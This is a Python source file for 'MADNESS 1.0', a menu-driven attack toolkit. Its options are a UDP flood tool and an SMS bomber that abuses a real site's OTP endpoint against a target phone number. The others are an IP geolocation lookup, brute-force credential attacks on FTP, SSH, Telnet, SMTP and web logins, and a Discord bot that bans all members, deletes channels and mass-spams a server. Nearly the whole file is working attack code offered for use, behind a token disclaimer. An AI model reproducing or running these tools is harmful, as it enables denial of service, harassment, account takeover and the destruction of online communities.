# -*- coding: utf-8 -*-
import requests
import subprocess
import os
import json
import colorama
from colorama import init, Fore
from colorama import init, Fore, Style
import time
init(autoreset=True)
import sys
import socket
import threading
import logging
import random
import urllib.request
import urllib.error
import urllib.parse
import http.cookiejar
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
import asyncio
import discord
from discord.ext import commands
import time
import threading
from discord.ext import tasks

logo = """
• ▌ ▄ ·.  ▄▄▄· ·▄▄▄▄   ▐ ▄ ▄▄▄ ..▄▄ · .▄▄ · 
·██ ▐███▪▐█ ▀█ ██▪ ██ •█▌▐█▀▄.▀·▐█ ▀. ▐█ ▀. 
▐█ ▌▐▌▐█·▄█▀▀█ ▐█· ▐█▌▐█▐▐▌▐▀▀▪▄▄▀▀▀█▄▄▀▀▀█▄
██ ██▌▐█▌▐█ ▪▐▌██. ██ ██▐█▌▐█▄▄▌▐█▄▪▐█▐█▄▪▐█
▀▀  █▪▀▀▀ ▀  ▀ ▀▀▀▀▀• ▀▀ █▪ ▀▀▀  ▀▀▀▀  ▀▀▀▀ 
"""

credits = """
MADNESS 1.0
Made by TWC [The Wrecking Crew]
Coded by Evos Madness.
"""

legal = """
Notice: It is your responsibility to suffer any leg-al consequences that may follow, by any causes of using this tool.
"""
FlameGRAVE = """
▄████  █    ██   █▀▄▀█ ▄███▄     
█▀   ▀ █    █ █  █ █ █ █▀   ▀    
█▀▀    █    █▄▄█ █ ▄ █ ██▄▄      
█      ███▄ █  █ █   █ █▄   ▄▀   
 █         ▀   █    █  ▀███▀     
  ▀           █    ▀             
             ▀                   
  ▄▀  █▄▄▄▄ ██       ▄   ▄███▄   
▄▀    █  ▄▀ █ █       █  █▀   ▀  
█ ▀▄  █▀▀▌  █▄▄█ █     █ ██▄▄    
█   █ █  █  █  █  █    █ █▄   ▄▀ 
 ███    █      █   █  █  ▀███▀   
       ▀      █     █▐           
             ▀      ▐            
"""
MadSpam = """
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀█▄▄           
█  █ ▀  █ ▐ ▄▀ ▀▄ █ ▄▀   █          
▐  █    █   █▄▄▄█ ▐ █    █          
  █    █   ▄▀   █   █    █          
▄▀   ▄▀   █   ▄▀   ▄▀▄▄▄▄▀          
█    █    ▐   ▐   █     ▐           
▐    ▐            ▐                 
 ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄ 
█ █   ▐ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ 
   ▀▄   ▐  █▀▀▀▀    █▄▄▄█ ▐  █    █ 
▀▄   █     █       ▄▀   █   █    █  
 █▀▀▀    ▄▀       █   ▄▀  ▄▀   ▄▀   
 ▐      █         ▐   ▐   █    █    
        ▐                 ▐    ▐    
"""
SCANNIT = """
   ▄▄▄▄▄   ▄█▄    ██      ▄      ▄   ▄█    ▄▄▄▄▀ 
  █     ▀▄ █▀ ▀▄  █ █      █      █  ██ ▀▀▀ █    
▄  ▀▀▀▀▄   █   ▀  █▄▄█ ██   █ ██   █ ██     █    
 ▀▄▄▄▄▀    █▄  ▄▀ █  █ █ █  █ █ █  █ ▐█    █     
           ▀███▀     █ █  █ █ █  █ █  ▐   ▀      
                    █  █   ██ █   ██             
                   ▀                             
"""
RedRipper = """
   /`-.   )\.---.     )\.-.                        
 ,' _  \ (   ,-._(  ,'     )                       
(  '-' (  \  '-,   (  .-, (                        
 ) ,_ .'   ) ,-`    ) '._\ )                       
(  ' ) \  (  ``-.  (  ,   (                        
 )/   )/   )..-.(   )/ ._.'                        
   /`-.  .'(     /`-.     /`-.   )\.---.     /`-.  
 ,' _  \ \  )  ,' _  \  ,' _  \ (   ,-._(  ,' _  \ 
(  '-' ( ) (  (  '-' ( (  '-' (  \  '-,   (  '-' ( 
 ) ,_ .' \  )  ) ,._.'  ) ,._.'   ) ,-`    ) ,_ .' 
(  ' ) \  ) \ (  '     (  '      (  ``-.  (  ' ) \ 
 )/   )/   )/  )/       )/        )..-.(   )/   )/ 
                                                   
"""
barrier = """
___________________________________________________
"""
while True:
    os.system("printf '\033]0;logo\007'")
    os.system("clear")
    print(Fore.RED + logo)
    print(Fore.RED + credits)
    print(Fore.BLUE + legal)
    print(Fore.RED + barrier)
    print(Fore.MAGENTA + "[1] FlameGRAVE DDoS Tool")
    print(Fore.CYAN + "[2] MadSpam SMS Bomber")
    print(Fore.GREEN + "[3] SCANNIT IP Lookup")
    print(Fore.RED + "[4] RedRipper BRUTE-FORCE Tool-Kit")
    print(Fore.RED + Style.BRIGHT + "[5] R3dM1st Discord Server Annihilator")
    print("[0] Exit")
    print(Fore.RED + barrier)
    print(" ")
    x = input(Fore.GREEN + "Option > ").strip()

    if x == "1":
        os.system("clear")
        print(Fore.MAGENTA + FlameGRAVE)
        server_ip = input(Fore.RED + "Enter Target IP: ").strip()
        port = int(input(Fore.RED + "Enter Target IP Port [1-65535]: ").strip())


        os.system("clear")
        print
        print(Fore.MAGENTA + FlameGRAVE)
        print(Fore.CYAN + barrier)
        print("\033[92m")
        print("________________ATTEMPTING TO FIND SERVER_____________________")
        time.sleep(3)
        print("_________________CONNECTING TO TARGET_______________________")
        time.sleep(3)
        print("__________________CHARGING FIREBALLS________________________")
        time.sleep(3)
        print(Fore.RED + "_________________TARGET IS GETTING SWARMED!________________________")
        time.sleep(3)
        print  
        print(Fore.MAGENTA + "SHOOTING FIREBALLS!. We hope you are using this for ethical purposes. Type Ctrl+C to suspend the attack.")
        time.sleep(2)
        socks = []
        for i in range(25):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socks.append(sock)
        bytes = random._urandom(1497)
        sent = 0
        try:
            while True:
                for sock in socks:
                       sock.sendto(bytes, (server_ip, port))
                       sent = sent + 1
                       port = port
                sys.stdout.write(Fore.RED + "Fireball %s shot to %s through port:%s\n" % (sent, server_ip, port))
                sys.stdout.flush()
        except KeyboardInterrupt:
            input("\nAttack suspended. Press Enter to return to the menu...")

    if x == "2":
        os.system("clear")

        def send(num, counter, sleep):
            url = "https://www.quikr.com/SignIn?aj=1&for=send_otp&user="
            hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
            #data={"phone":num}
            result_url = url+num

            req = urllib.request.Request(result_url, headers=hdr)
            for i in range(counter):
                try:
                    page = urllib.request.urlopen(req)
                    print(Fore.MAGENTA + " Message sent! (Attempt {})".format(i+1))
                except urllib.error.HTTPError as e:
                    print(" HTTP Error {}: {}".format(e.code, e.reason))
                except urllib.error.URLError as e:
                    print("URL Error: {}".format(e.reason))
                time.sleep(sleep)

        try:
            print(Fore.CYAN + MadSpam)
            print(Fore.RED + barrier)
            number = input(Fore.RED + "Enter Full Target Number [With CC]: ")
            count = input(Fore.RED + "Enter number of SMS Messages: ")
            throttle = input(Fore.RED + "Enter time interval: ")
            os.system("clear")
            print(Fore.CYAN + MadSpam)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "_________________CONNECTING TO API_________________")
            time.sleep(3)
            print(" ")
            print(Fore.RED + " MAD SPAMMING STARTED! type Ctrl+C to suspend the SMS Bomber.")
            time.sleep(1)
            print(" ")
            send(number, int(count), int(throttle))
            input(" Press Enter to return to menu...")
        except KeyboardInterrupt:
           input("\nSpamming suspended. Press Enter to return to the menu...")
        finally:
            pass

    if x == "3":
        os.system("clear")
        print(Fore.GREEN + SCANNIT)
        print(Fore.RED + barrier)
        ip = input(Fore.RED + "Enter Target IP address: ")
        time.sleep(1)
        os.system("clear")
        r = requests.get("http://ip-api.com/json/" + ip)
        data = r.json()
        print(Fore.GREEN + SCANNIT)
        print(Fore.RED + barrier)
        print(" ")
        print(Fore.RED + "_________________RESOLVING IP ADDRESS_________________")
        time.sleep(3)
        print(Fore.RED + "_________________SCANNING IP ADDRESS_________________")
        time.sleep(3)
        print(" ")
        print(Fore.GREEN + " IP ADDRESS SCANNED SUCCESSFULLY!")
        time.sleep(1)
        print(" ")
        print(Fore.BLUE + " Notice : Coordinates may not be 100% accurate to the exact Target's place.")
        print(" ")
        print (Fore.CYAN + " Country: " + data["country"])
        time.sleep(0.25)
        print (Fore.CYAN + " City: " + data["city"])
        time.sleep(0.25)
        print (Fore.CYAN + " Region: " + data["regionName"])
        time.sleep(0.25)
        print (Fore.CYAN + " Time Zone: " + data["timezone"])
        time.sleep(0.25)
        print (Fore.CYAN + " Coordinates [Latitude]: " + str(data["lat"]))
        time.sleep(0.25)
        print (Fore.CYAN + " Coordinates [Longitude]: " + str(data["lon"]))
        time.sleep(0.25)
        print (Fore.CYAN + " Internet company [ISP]: " + data["isp"])
        time.sleep(3)
        print(" ")
        input(" Press Enter to return to menu...")

    if x == "4":
        os.system("clear")
        print(Fore.RED + RedRipper)
        print(Fore.RED + barrier)
        print(Fore.MAGENTA + "[1] FTP Attack")
        print(Fore.MAGENTA + "[2] SSH Attack")
        print(Fore.MAGENTA + "[3] Telnet Attack")
        print(Fore.MAGENTA + "[4] SMTP Attack")
        print(Fore.RED + "[5] Admin Panel or Login Brute Force")
        print("[6] Return\n")

        def load_list(value):
            value = value.strip()
            if not value:
                print("INVALID WORDLIST.")
                input("Press Enter to return...")
                return []

            if os.path.isfile(value):
                if os.path.getsize(value) == 0:
                    print("Wordlist empty.")
                    sys.exit(1)

                try:
                    with open(value, "r") as f:
                        items = [line.strip() for line in f if line.strip()]
                    if not items:
                        print("Wordlist empty.")
                        sys.exit(1)
                    return items
                except:
                    print("Cannot read wordlist.")
                    sys.exit(1)

            return [value]

        def perform_ftp_attack(target_ip, ftp_port, user, passwd):
            ftp_commands = "user {} {}\nquit\n".format(user, passwd)
            proc = subprocess.Popen(['ftp', '-n', target_ip, str(ftp_port)],
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate(ftp_commands)
            return proc.returncode

        def perform_ssh_attack(target_ip, ssh_port, user, passwd):
            ssh_command = [
                'sshpass', '-p', passwd,
                'ssh', '-o', 'StrictHostKeyChecking=no',
                '-p', str(ssh_port),
                '{}@{}'.format(user, target_ip)
            ]
            proc = subprocess.call(ssh_command)
            return proc

        def perform_telnet_attack(target_ip, telnet_port, user, passwd):
            telnet_command = ['telnet', target_ip, str(telnet_port)]
            proc = subprocess.Popen(telnet_command,
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            time.sleep(1)
            try:
                proc.stdin.write("{}\n{}\n".format(user, passwd))
                proc.stdin.flush()
            except:
                pass
            proc.stdin.close()
            proc.wait()
            return proc.returncode

        def perform_smtp_attack(target_ip, smtp_port, user, passwd):
            smtp_command = [
                'swaks',
                '--to', user,
                '--from', user,
                '--server', target_ip,
                '--port', str(smtp_port),
                '--auth', 'LOGIN',
                '--auth-user', user,
                '--auth-password', passwd
            ]
            proc = subprocess.call(smtp_command)
            return proc

        def perform_web_attack():
            os.system("clear")
            print(Fore.RED + RedRipper)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "           |WEB LOGIN CREDENTIAL RIPPER|\n")

            try:
                URL = input(Fore.CYAN + "Enter Target URL: ").strip()
                FIELD1 = input(Fore.CYAN + "Enter Username Field (leave empty to skip): ").strip()
                VALID = input(Fore.MAGENTA + "Enter Valid Username (leave empty to skip): ").strip()
                FIELD2 = input(Fore.CYAN + "Enter Second Field (Password OR Username field): ").strip()
                WORDLIST = input(Fore.CYAN + "Enter Username or Password Wordlist (.txt): ").strip()
                FAIL = input(Fore.CYAN + "Enter Fail-String (invalid indicator): ").strip()
                OUTPUT = input(Fore.CYAN + "Enter Output File (success.txt): ").strip()

                try:
                    words = open(WORDLIST, "r").read().splitlines()
                except Exception as e:
                    print(Fore.RED + "ERROR reading wordlist: {}".format(e))
                    input("Press Enter...")
                    return

                print(Fore.MAGENTA + "\nRIPPING CREDENTIALS...\n")
                open(OUTPUT, "a").close()

                mode = "password" if VALID != "" else "username"

                if mode == "password":
                    if FIELD1 == "" or FIELD2 == "":
                        print(Fore.RED + "ERROR: FIELD1 and FIELD2 are required for password bruteforce.")
                        input("Press Enter...")
                        return

                else:
                    if FIELD2 == "":
                        print(Fore.RED + "ERROR: FIELD2 (username field) is required for username bruteforce.")
                        input("Press Enter...")
                        return

                for user in words:
                    print(Fore.YELLOW + "Trying: {}".format(user))

                    if mode == "username":
                        data = { FIELD2: user }
                    else:
                        data = { FIELD1: VALID, FIELD2: user }

                    try:
                        r = requests.post(URL, data=data, timeout=10)
                    except requests.exceptions.Timeout:
                        print(Fore.RED + "[ERROR] Timeout:", user)
                        continue
                    except requests.exceptions.ConnectionError:
                        print(Fore.RED + "[ERROR] Connection lost.")
                        input("Press Enter...")
                        break
                    except Exception as e:
                        print(Fore.RED + "[ERROR] Unexpected:", e)
                        return

                    if FAIL not in r.text:
                        print(Fore.GREEN + "\n[VALID FOUND] -> " + user)
                        try:
                            with open(OUTPUT, "a") as out:
                                out.write(user + "\n")
                        except:
                            print(Fore.RED + "[ERROR] Cannot write output file.")

                        input("\nPress Enter...")
                        break

                    else:
                        print(Fore.RED + "[INVALID] " + user)

                print(Fore.RED + "\nBruteforce complete. No valid match found.")
                input("Press Enter...")

            except KeyboardInterrupt:
                print(Fore.YELLOW + "\nStopped by user.")
                input("Press Enter...")
                return

        def perform_attack(target_type):
            os.system("clear")
            print(Fore.RED + RedRipper)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "       |{} CREDENTIAL RIPPER|\n".format(target_type))

            target_ip = input(Fore.RED + "Enter Target IP: ")
            target_port = input(Fore.RED + "Enter {} Port: ".format(target_type))
            username_input = input(Fore.CYAN + "Enter Username Wordlist: ")
            password_input = input(Fore.CYAN + "Enter Password Wordlist: ")

            usernames = load_list(username_input)
            passwords = load_list(password_input)

            success_file = "{}_success_log.txt".format(target_type)
            open(success_file, "a").close()

            for user in usernames:
                for passwd in passwords:
                    if target_type == "FTP":
                        attack_command = lambda: perform_ftp_attack(target_ip, target_port, user, passwd)
                    elif target_type == "SSH":
                        attack_command = lambda: perform_ssh_attack(target_ip, target_port, user, passwd)
                    elif target_type == "Telnet":
                        attack_command = lambda: perform_telnet_attack(target_ip, target_port, user, passwd)
                    elif target_type == "SMTP":
                        attack_command = lambda: perform_smtp_attack(target_ip, target_port, user, passwd)
                    else:
                        print("Unknown target type.")
                        return

                    print("Trying {} - {} : {}".format(target_type, user, passwd))
                    retcode = attack_command()

                    if retcode == 0:
                        print(Fore.GREEN + "SUCCESS: {} {} {}".format(target_ip, user, passwd))
                        with open(success_file, "a") as sf:
                            sf.write("IP: {}, User: {}, Pass: {}\n".format(target_ip, user, passwd))
                        ex = input("Exit or Continue? [E/C]: ").lower()
                        if ex == "e":
                            return
                    else:
                        print(Fore.RED + "FAILED: {} {}".format(user, passwd))

            input("Press Enter...")

        choice = input(Fore.GREEN + "Option > ")

        if choice == "1":
            perform_attack("FTP")
        elif choice == "2":
            perform_attack("SSH")
        elif choice == "3":
            perform_attack("Telnet")
        elif choice == "4":
            perform_attack("SMTP")
        elif choice == "5":
            perform_web_attack()
        elif choice == "6":
            input("Press Enter to return...")
        else:
            input("Invalid choice. Press Enter...")

    if x == "5":
        os.system("clear")
        R3DM1ST = """
        ▄▄▄  ▄▄▄ .·▄▄▄▄        
        ▀▄ █·▀▄.▀·██▪ ██       
        ▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌      
        ▐█•█▌▐█▄▄▌██. ██       
       .▀  ▀ ▀▀▀ ▀▀▀▀▀•       
        • ▌ ▄ ·. ▪  .▄▄ · ▄▄▄▄▄
        ·██ ▐███▪██ ▐█ ▀. •██  
        ▐█ ▌▐▌▐█·▐█·▄▀▀▀█▄ ▐█.▪
        ██ ██▌▐█▌▐█▌▐█▄▪▐█ ▐█▌·
        ▀▀  █▪▀▀▀▀▀▀ ▀▀▀▀  ▀▀▀ 
        """

        print(Fore.MAGENTA + R3DM1ST)
        print(Fore.RED + "=" * 49)
        print(" ")

        BOT_TOKEN = input(Fore.GREEN + " + INSERT BOT TOKEN: ")

        if not BOT_TOKEN.strip():
            continue

        PREFIX = "!"

        # Nuke Configuration
        CHANNEL_NAME = "FLARED"
        MESSAGE = "@everyone @here 👎︎⚐︎☠︎❄︎ 💧︎✌︎✡︎ ✋︎ 👎︎✋︎👎︎☠︎❄︎ 🕈︎✌︎☼︎☠︎ ✡︎⚐︎🕆︎ - ✋︎ 🕈︎⚐︎☠︎🕯︎❄︎ ☹︎☜︎❄︎ ✡︎⚐︎🕆︎ ☝︎☜︎❄︎ ✌︎🕈︎✌︎✡︎ ❄︎☟︎✋︎💧︎ ❄︎✋︎💣︎☜︎/ D̶̢̧̰͇͝Ơ̶̰̝̬͒N̴̖̹̳̂̏͝'̵͔̣̪͒̄̏T̵̥͒ ̸͈̗̽Ş̷̜̯̼̈̓A̶̲̜̳͂Ŷ̸̮́̏ ̴͎̠̙̓̅̓̍I̵̪̠͍̹̚ ̷̣̺̙̈ͅD̴͈̮̐I̷̺̜̒D̷͖̋̂̀N̴̙̦͙̈́̆͆'̵̩͖͈̓T̵̫̟̺̉ ̶͓͇̒͗̔W̷̥͋̕̕À̴̧̗̌R̴͔̎̏͌N̷̓̿ͅ ̵̠̤̾Y̶̡͖̙͂̚̚͠Õ̵̠͔̭͖̃̕Ù̶̍́ͅ,̵̤̪̳͌̿ ̸̥̫̬̱̒͋̈́̔-̵̡̓ ̷̝̻͇̓̉̅W̴̛̗̃͐̾͜O̷͉̞͝N̸͓̱̰͑̊'̷̤̖̆T̷̖̬̆̈̂͑ ̶̮̖̎͑̑̄L̷̺̭̭͖̒͐E̴͉͕̽͜T̴̢͍̞̈́͛̌̓͜ ̴̲̭̠͒̂͜Ỷ̸̫̽O̵̜̎͐̏̕Ữ̸̱̗͓͠ ̵̢͈̰͘͜͠G̶̎͊͗͜E̶̺̿T̴͓͚̣̝̐ ̶̨͚̓̈́̃A̴̛̩̼͔̾̎W̷̺̳̽͛A̴̛̫̰̥̤͆́̍Y̵̻̞͊͝ ̸̧͓̏͜T̵̖̀̆̀H̸̬͂I̵͔̱͈͇͛͗̍Ŝ̶̡̱̗̀̏͝ ̷̺͝T̸͇͓͖̉̀̏͘͜I̶͖̠͂̔͌͂M̸̢̔Ẹ̴͙͈̉̈́̓"
        AMOUNT_OF_CHANNELS = 303
        AMOUNT_OF_MESSAGES = 1000
        SERVER_NAME = "PURGED"

        # Random channel name variations (optional - set to None to use CHANNEL_NAME)
        RANDOM_CHANNEL_NAMES = [
            "B̷̧̡̢̡̢̡̧̛͓̮̙̣̩̮̗͎̠̩͔̘̰̖̲̮̼̩̹̩̠͖̬̺͖̲͕͓̪̞̼̻̍̋̒́͛͑̏̒̈͆͗͘ͅͅŲ̶̧̛̲̺̭͉̳̯̭͈̫͖͕̳̰̩̼͙̪̥̦̟̙̣̻̭͔̬̟̬͖̞͉̣͔͚̺͙̻͈̋́̓̊̿̆͊̄͊͒̏̍͒͛̓͒͑͛̇͐͛̈̈́̑̓̂̎̿̾̃̉̽̑͌̈́̌̔͘̕̕͝͝R̷̢̧̨̧̨̯͎̖̰͇̻̼͍̗̞̭̱̝̰͇͙̞̩̗͖̻̯͓̹̙̳̙̮̺̝̪̻̝͔̭̝̝̰̳͈̙͕̎̇̾̍̃̓́̂̀̅̈́̇͆͋͛̊̊̋̏̽͋̍͒̄̔̉̀͑̔̀̕̕N̸̨̡̛͉̩̰̦̘̼͓̻͚͉͔̭̣̩͔̖̩̙͈͉̜͋͑̌̿̈́̌̆̄̀̎͑̿́̍͊̈́̓͝E̷̮̙͎̖͙̦̠̺̳̰̪͚͙̹͖̰͍̺̲̱͙͖̙̯̪͚̫̤̫̎͠ͅD̶̢̛̛͔̖̭͙͈̤̳̣͉͍̘̬̘̙̪͉̱̘̣̫͔͇͖͕͕̲̣̤̦̜͚̼̠̠͓̏̈́̓͆͂̊͆̏̏̃͛̊͒͛̒͂̋̔̓͗̐́̀͊͘͘̕͜͜͜͝ͅ",
            "D̵͍̻̖̳̆͑͊̾E̵̫̍͌͊̕͠S̴̠̪͈̆̊̽͜Ţ̴̟̄̈́̉̑̓̕R̸̻͎̄O̵͚̫̲͍̩̪̊́Ÿ̸͙̹́̎̐̃E̶̤̗̫͉̰̒͛͜D̸̤̥̒͂̊̿͂̊",
            "E̸̛̗̋̇̔̔̈͠͠Ļ̴͉̬̠͚̉̐̅̃͐͠Ì̶̧̧̛͔̖̝̘̝͝Ṃ̶̨̛̤̓̓̈́̔I̶̖̮̋͒N̷̗͇̰̗̼̖̔̎̄Ȃ̷͍̥Ţ̷̜͚̼̫͊͆̎̔͜͝͝E̷͖̻̻̗̥̪͝D̵̞̦̠̈́",
            "👌︎🕆︎☼︎☠︎☜︎👎︎",
            "👎︎☜︎💧︎❄︎☼︎⚐︎✡︎☜︎👎︎",
            "☞︎☹︎✌︎☼︎☜︎👎︎"
        ]

        USE_RANDOM_NAMES = True  # Set to False to use CHANNEL_NAME only

        screen = "menu"
        ui_started = False

        os.system("clear")

        def get_channel_name():
            """Get channel name (random or fixed)"""
            if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
                return random.choice(RANDOM_CHANNEL_NAMES)
            return CHANNEL_NAME

        intents = discord.Intents.default()
        intents.guilds = True
        intents.members = True
        intents.message_content = True

        bot = commands.Bot(command_prefix=PREFIX, intents=intents)

        @tasks.loop(count=1)
        async def rename_server():
            await bot.wait_until_ready()

            for guild in bot.guilds:
                try:
                    await guild.edit(name=SERVER_NAME)
                except Exception as e:
                    print(f"Failed: {e}")

        async def send_messages_fast(channels, message, total):
            """Send messages with rate limiting using semaphore"""
            if not channels:
                return
    

            semaphore = asyncio.Semaphore(50)
    
            async def send_with_limit(channel, msg):
                async with semaphore:
                    try:
                        await channel.send(msg)
                    except Exception:
                        pass
    
            tasks = []
            for i in range(total):
                channel = channels[i % len(channels)]
                tasks.append(send_with_limit(channel, message))
    
            await asyncio.gather(*tasks, return_exceptions=True)

        async def ban_members(guild, reason=None):
            banned_count = 0

            for member in guild.members:
                if member == guild.owner:
                    continue

                try:
                    await member.ban(reason=reason)
                except discord.errors.Forbidden:
                    continue

                except discord.errors.HTTPException as e:
                    await asyncio.sleep(2)
                    continue

                banned_count += 1
            print(Fore.MAGENTA + f"PURGED {banned_count} USERS IN TARGET SERVER")

        async def RAMPAGE_server(guild: discord.Guild):
            """Main RAMPAGE logic -renames server, deletes all channels, bans members, creates new channels, and spams messages"""
            print(Fore.MAGENTA + "RED MIST APPROACHING THE TARGET")
            print(" ")
            start_time = time.perf_counter()

            rename_server.start()

            print(Fore.RED + "!––––––—–PURGING CHANNELS AT THE MOMENT–––––––—–!")
            print(" ")

            print(Fore.RED + "!––––––—–PURGING SERVER MEMBERS–––––––—–!")
            reason = "D̵̛͉O̶͉̊̕N̷͈̂Ţ̵̞̓̑ ̶̙́S̵̱̘̅̀Ą̸̀͑Y̵͍̣̿ ̸͖̐͌I̵͍̭̋ ̵̺͔̚Ḍ̷̒I̵̪͐͝D̵̛̺̿ͅŃ̶̗̼̕'̶̙͇̒T̸̫̦͂̕ ̵͎̒̑W̸͚̱̕A̶͈͚̍͛R̴̹̖̈N̵͉͋ ̷̱̘̂́Ý̴͖̥O̸̘̙̓Ů̴͇̹"
            banned_count = await ban_members(guild, reason)
            print(" ")

            await asyncio.gather(
                *(channel.delete() for channel in guild.channels),
                return_exceptions=True
            )

            print(Fore.RED + "!–––––––––——–––ADDING 303 CHANNELS–––––––––––––——!")
            print(" ")
            async def create_raid_channel():
                return await guild.create_text_channel(get_channel_name())
    
            channels = await asyncio.gather(
                *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
                return_exceptions=True
            )

            text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
            if text_channels:
                print(Fore.MAGENTA + "!!!!!––———–––SPAMMING TARGET SERVER–––—––—–––!!!!!")
                await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

            elapsed = time.perf_counter() - start_time
            print(Fore.GREEN + f"EXECUTION SUCCEEDED WITHIN {elapsed:.2f}s")

        def render(bot):
            os.system("clear")
        
            if screen == "menu":
                print(Fore.MAGENTA + R3DM1ST)
                print(Fore.BLUE + "Made by TWC (The Wrecking Crew)")
                print(Fore.RED + "THE MADNESS HAS STARTED – F̸͈͚̲̌̀̀̽Ĩ̸͎͙̳N̷̛͍̯͔͛̎͛I̴͇͑S̷̟̼͓̭̊͆͘H̷̩̱̙́̽̕͠ ̶͇̗͉̔̿Ṫ̴̝̥̮̘̌Ḩ̷͉̅̍̆͜E̶͈̼̝͒̐́M̵̳̻̏̓")
                print(Fore.MAGENTA + "—" * 50)
                print(Fore.GREEN + "- STATUS: ONLINE – OPERATIONS READY TO EXECUTE")
                print(Fore.MAGENTA + "—" * 50)
                print(Fore.GREEN + "- PREFIX: !")
                print(Fore.MAGENTA + "—" * 50)
                print(Fore.RED + "- LAUNCH: !RAMPAGE")
                print(Fore.MAGENTA + "—" * 50)
                print(Fore.BLUE + "- Welcome to R3dM1st console, the purpose of this console is to keep track and analyze the process of operations done using R3dM1st.")
                print(Fore.MAGENTA + "—" * 50)
                print(Fore.WHITE + " Press ENTER to view target servers list")
                print(Fore.CYAN + "• Awaiting launch by operator(s).")
                print(" ")

            if screen == "targets":
                print(Fore.MAGENTA + "—" * 50)
                print(Fore.RED + "                  !LIST OF TARGETS!")
                print(Fore.MAGENTA + "—" * 50)
                for g in bot.guilds:
                    print(f"{g.name} ({g.id})")
                print(Fore.MAGENTA + "—" * 50)
                print(" ")
                print(Fore.WHITE + "Press ENTER to return...")
    
        def input_loop(bot, loop):
            global screen
            while True:
                input()
                screen = "targets" if screen == "menu" else "menu"
                loop.call_soon_threadsafe(render, bot)

        @bot.event
        async def on_ready():
            global ui_started
            if ui_started:
                return
            os.system("clear")
            print(Fore.MAGENTA + R3DM1ST)
            print(Fore.BLUE + "Made by TWC (The Wrecking Crew)")
            print(Fore.RED + "THE MADNESS HAS STARTED – F̸͈͚̲̌̀̀̽Ĩ̸͎͙̳N̷̛͍̯͔͛̎͛I̴͇͑S̷̟̼͓̭̊͆͘H̷̩̱̙́̽̕͠ ̶͇̗͉̔̿Ṫ̴̝̥̮̘̌Ḩ̷͉̅̍̆͜E̶͈̼̝͒̐́M̵̳̻̏̓")
            await asyncio.sleep(2)
            print(Fore.MAGENTA + "—" * 50)
            print(Fore.GREEN + "- STATUS: ONLINE – OPERATIONS READY TO EXECUTE")
            print(Fore.MAGENTA + "—" * 50)
            await asyncio.sleep(1)
            print(Fore.GREEN + "- PREFIX: !")
            print(Fore.MAGENTA + "—" * 50)
            await asyncio.sleep(0.5)
            print(Fore.RED + "- LAUNCH: !RAMPAGE")
            print(Fore.MAGENTA + "—" * 50)
            await asyncio.sleep(1)
            print(Fore.BLUE + "- Welcome to R3dM1st console, the purpose of this console is to keep track and analyze the process of operations done using R3dM1st.")
            print(Fore.MAGENTA + "—" * 50)
            await asyncio.sleep(0.25)
            print(Fore.WHITE + " Press ENTER to view target servers list")
            print(Fore.CYAN + "• Awaiting launch by operator(s).")
            print(" ")
            render(bot)
            if not ui_started:
                ui_started = True
                loop = asyncio.get_running_loop()

                threading.Thread(
                    target=input_loop,
                    args=(bot, loop),
                    daemon=True
                ).start()

        @bot.command(name="RAMPAGE")
        async def RAMPAGE(ctx):
            """RAMPAGE the current server"""
            if not ctx.author.guild_permissions.administrator:
                await ctx.send(" ☹ - OPERATION UNSUCCESSFUL; ADMIN PRIVELEGES REQUIRED")
                return

            await ctx.send(" THE RED MIST HAS ENGULFED - D̵̡̗͐̓O̶̼̜͗̒Ṅ̸͔'̴͉̓̓T̴̰̩͊͠ ̸͇̖͊̍H̵̩̓́Ǫ̵̻̀L̶̪͒̒D̵͔̞̀ ̶̱̄̓B̷̘͐A̸̲̒̿C̷̰̀Ḱ̵̯͚̉ =)")
    
            await RAMPAGE_server(ctx.guild)

        @bot.command(name="config")
        async def config(ctx):
            """Show current configuration"""
            config_msg = f"""
        **Current Configuration:**
        Channel Name: `{CHANNEL_NAME}`
        Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
        Message: `{MESSAGE[:50]}...`
        Channels: `{AMOUNT_OF_CHANNELS}`
        Messages: `{AMOUNT_OF_MESSAGES}`
        """
            await ctx.send(config_msg)
    
        if __name__ == "__main__":
            print(Fore.RED + "=" * 50)
            print(Fore.MAGENTA + "                                                                 !START-UP DIAGNOSTICS!                                                ")
            print(Fore.RED + "=" * 50)
            bot.run(BOT_TOKEN)

    if x == "0":
        print("Exiting...")
        break

    if x not in ["0", "1", "2", "3", "4" "5"]:
        print("Invalid option.")
        input(" Press Enter to return to menu...")
     
